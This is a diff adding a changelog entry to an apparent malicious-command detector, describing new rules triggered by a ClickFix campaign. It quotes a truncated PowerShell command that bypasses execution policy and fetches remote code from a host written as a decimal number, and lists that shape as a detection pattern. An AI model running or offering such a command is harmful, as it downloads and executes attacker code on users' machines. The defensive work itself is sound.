@@ -1,5 +1,18 @@
 # Changelog
 
+## 0.4.12
+
+From Huntress's write-up of the ChatGPT Custom GPT ClickFix campaign
+(September 2026). Its command, `"...\PowerShell.exe" -ExecutionPolicy
+Bypass "irm 1614733393/12 | ..."`, raised F14 only with lure words around
+it.
+
+- **F14's strong terms ignore case.**
+- **Two strong shapes:** PowerShell run with a flag however it is quoted,
+  and a download from a host written as one decimal number (`irm
+  1614733393/`, `http://1614733393`). Either alone makes F14 HIGH.
+- 213 tests (was 210).
+
 ## 0.4.11
 
 - **S4 sees any markup under a media name**, not only files that open
